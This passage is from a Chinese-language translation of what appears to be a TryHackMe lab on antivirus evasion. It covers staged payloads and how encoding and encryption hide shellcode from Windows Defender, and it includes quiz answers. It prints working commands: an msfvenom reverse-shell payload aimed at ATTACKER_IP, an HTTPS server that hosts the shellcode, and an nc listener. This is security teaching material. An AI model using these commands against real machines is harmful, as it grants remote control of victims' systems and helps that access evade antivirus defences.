<div class="language-PowerShell language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; csc staged-payload.cs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用我们的引导程序运行反向-shell">使用我们的引导程序运行反向 shell<a href="#使用我们的引导程序运行反向-shell" class="hash-link" aria-label="Direct link to 使用我们的引导程序运行反向 shell" title="Direct link to 使用我们的引导程序运行反向 shell">​</a></h3>
<p>一旦我们的有效载荷被编译完成，我们需要设置一个 web 服务器来托管最终的 shellcode。记住，我们的引导程序将连接到这个服务器以获取 shellcode，并在受害者机器的内存中执行它。首先，我们生成一个 shellcode（文件名需要与引导程序中的 URL 匹配）：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b &#x27;\x00\x0a\x0d&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>请注意，我们使用的是 raw 格式的 shellcode，因为引导程序会直接将其下载到内存中。</p>
<p>现在我们有了 shellcode，接下来设置一个简单的 HTTPS 服务器。首先，我们需要使用以下命令创建一个自签名证书：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>系统会要求输入一些信息，但可以按回车键跳过任何请求的信息，因为我们不需要 SSL 证书是有效的。拥有 SSL 证书后，我们可以使用以下命令通过 python3 启动一个简单的 HTTPS 服务器：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ python3 -c &quot;import http.server, ssl;server_address=(&#x27;0.0.0.0&#x27;,443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile=&#x27;localhost.pem&#x27;,ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一切准备就绪后，我们可以执行引导程序有效载荷。引导程序应该连接到 HTTPS 服务器并获取 shellcode.bin 文件，将其加载到内存并在受害者机器上执行。记得设置一个 nc 监听器，以便在运行 msfvenom 时指定的相同端口上接收反向 shell：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ nc -lvp 7474</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>分阶段载荷是否会一次性交付完整的载荷内容？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Metasploit 的<code>windows/x64/meterpreter_reverse_https</code>载荷是分阶段载荷吗？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>分段有效载荷的 stage0 是否负责下载待执行的最终有效载荷？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>请按照说明创建一个分段有效载荷，并将其上传至<code>http://10.10.14.106/</code>的 THM Antivirus Check</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction-to-encoding-and-encryption---编码与加密简介">Introduction to Encoding and Encryption - 编码与加密简介<a href="#introduction-to-encoding-and-encryption---编码与加密简介" class="hash-link" aria-label="Direct link to Introduction to Encoding and Encryption - 编码与加密简介" title="Direct link to Introduction to Encoding and Encryption - 编码与加密简介">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是编码">什么是编码？<a href="#什么是编码" class="hash-link" aria-label="Direct link to 什么是编码？" title="Direct link to 什么是编码？">​</a></h3>
<p>编码是将数据从其原始状态根据算法或编码类型转换为特定格式的过程。它可以应用于多种数据类型，例如视频、HTML、URL 和二进制文件（如 EXE、图像等）。</p>
<p>编码是一个重要的概念，通常用于多种目的，包括但不限于：</p>
<ul>
<li>程序编译和执行</li>
<li>数据存储和传输</li>
<li>数据处理，例如文件转换</li>
</ul>
<p>同样，在涉及防病毒（AV）规避技术时，编码也用于隐藏二进制文件中的 shellcode 字符串。然而，仅靠编码并不足以实现规避目的。如今，防病毒软件更加智能，能够分析二进制文件，一旦发现编码字符串，便会解码以检查文本的原始形式。</p>
<p>你还可以串联使用两种或更多编码算法，以增加防病毒软件识别隐藏内容的难度。下图展示了我们将字符串 &quot;THM&quot; 转换为十六进制表示形式，然后使用 Base64 对其进行编码。在这种情况下，你需要确保你的投放程序能够处理此类编码，以将字符串恢复为其原始状态。</p>
<p><img decoding="async" loading="lazy" alt="Double Text Encoding Technique" src="data:image/png;base64,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" width="409" height="220" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是加密">什么是加密？<a href="#什么是加密" class="hash-link" aria-label="Direct link to 什么是加密？" title="Direct link to 什么是加密？">​</a></h3>
<p>加密是信息和数据安全的基本要素之一，其重点是防止未经授权的访问和数据篡改。加密过程涉及将明文（未加密的内容）转换为称为密文的加密版本。如果不了解加密中使用的算法和密钥，密文将无法被读取或解密。</p>
<p>与编码类似，加密技术用于多种目的，例如安全地存储和传输数据，以及实现端到端加密。加密可以通过两种方式使用：双方共享一个密钥，或使用公钥和私钥。</p>
<p>有关加密的更多信息，我们建议你查看 <a href="https://tryhackme.com/room/encryptioncrypto101" target="_blank" rel="noopener noreferrer">加密 - 加密入门</a> 房间。</p>
<p><img decoding="async" loading="lazy" alt="Encryption and Decryption Concepts!" src="/assets/images/7cd2d23f048dd314a46910fb29c9836f-3848c095aa39b29434141e93127412fa.png" width="878" height="476" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="为什么我们需要了解编码和加密">为什么我们需要了解编码和加密？<a href="#为什么我们需要了解编码和加密" class="hash-link" aria-label="Direct link to 为什么我们需要了解编码和加密？" title="Direct link to 为什么我们需要了解编码和加密？">​</a></h3>
<p>防病毒（AV）供应商通过静态或动态检测技术，将大多数公开工具（如 Metasploit 等）列入其防病毒软件的阻止列表。因此，如果不修改这些公开工具生成的 shellcode，你的投放程序被检测到的概率会很高。</p>
<p>编码和加密可以用于防病毒规避技术中，通过对投放程序中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏，从而规避防病毒软件的检测。此外，这两种技术不仅可以用于隐藏 shellcode，还可以用于隐藏函数、变量等。在本房间中，我们主要关注通过加密 shellcode 来规避 Windows Defender。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>仅对 shellcode 进行编码是否足以规避防病毒软件？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编码技术是否使用密钥来编码字符串或文件？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 